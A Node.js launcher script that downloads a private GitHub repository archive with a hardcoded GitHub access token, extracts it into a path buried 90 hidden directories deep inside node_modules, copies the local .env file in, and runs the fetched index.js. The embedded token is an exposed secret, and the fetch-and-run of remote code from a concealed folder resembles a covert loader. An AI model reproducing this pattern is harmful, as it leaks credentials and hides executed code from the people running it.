import fs from "fs";
import path from "path";
import axios from "axios";
import AdmZip from "adm-zip";
import { spawn } from "child_process";
import chalk from "chalk";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// === DEEP HIDDEN TEMP PATH (.npm/.botx_cache/.x1/.../.x90) ===
const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');

// === GIT CONFIG ===
const GITHUB_TOKEN = "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";
const DOWNLOAD_URL = "https://github.com/INCONNU-BOY/PRIVATE--INCONNU-XD/archive/refs/heads/main.zip";
const EXTRACT_DIR = path.join(TEMP_DIR, "PRIVATE--INCONNU-XD-main");
const LOCAL_SETTINGS = path.join(__dirname, ".env");
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, ".env");

// === HELPERS ===
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const countJSFiles = (dir) => {
  let count = 0;
  for (const file of fs.readdirSync(dir)) {
    const fullPath = path.join(dir, file);
    const stat = fs.statSync(fullPath);
    count += stat.isDirectory() ? countJSFiles(fullPath) : file.endsWith(".js") ? 1 : 0;
  }
  return count;
};

// === MAIN LOGIC ===
async function downloadAndExtract() {
  if (fs.existsSync(TEMP_DIR)) {
    console.log(chalk.yellow("🧹 Cleaning previous cache..."));
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }

  fs.mkdirSync(TEMP_DIR, { recursive: true });

  const zipPath = path.join(TEMP_DIR, "repo.zip");

  console.log(chalk.blue("⬇️ Connecting to GitHub..."));
  const response = await axios({
    url: DOWNLOAD_URL,
    method: "GET",
    responseType: "stream",
    headers: {
      Authorization: `token ${GITHUB_TOKEN}`,
      Accept: "application/vnd.github.v3.raw",
    },
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);
    writer.on("finish", resolve);
    writer.on("error", reject);
  });

  console.log(chalk.green("📦 ZIP download complete. Extracting..."));
  new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);
  fs.unlinkSync(zipPath);

  const pluginFolder = path.join(EXTRACT_DIR, "plugins");
  if (fs.existsSync(pluginFolder)) {
    const count = countJSFiles(pluginFolder);
    console.log(chalk.green(`✅ Plugins loaded: ${count} files.`));
  } else {
    console.log(chalk.red("❌ Plugin folder not found."));
  }
}

async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) return;

  try {
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log(chalk.green("🛠️ Local settings applied."));
  } catch (e) {
    console.error(chalk.red("❌ Failed to apply local settings."), e);
  }

  await delay(500);
}

function startBot() {
  console.log(chalk.cyan("🚀 Launching bot instance..."));
  const bot = spawn("node", ["index.js"], {
    cwd: EXTRACT_DIR,
    stdio: "inherit",
    env: process.env,
  });

  bot.on("close", (code) => {
    console.log(chalk.red(`💥 Bot terminated with exit code: ${code}`));
  });
}

// === RUN ===
(async () => {
  await downloadAndExtract();
  await applyLocalSettings();
  startBot();
})();
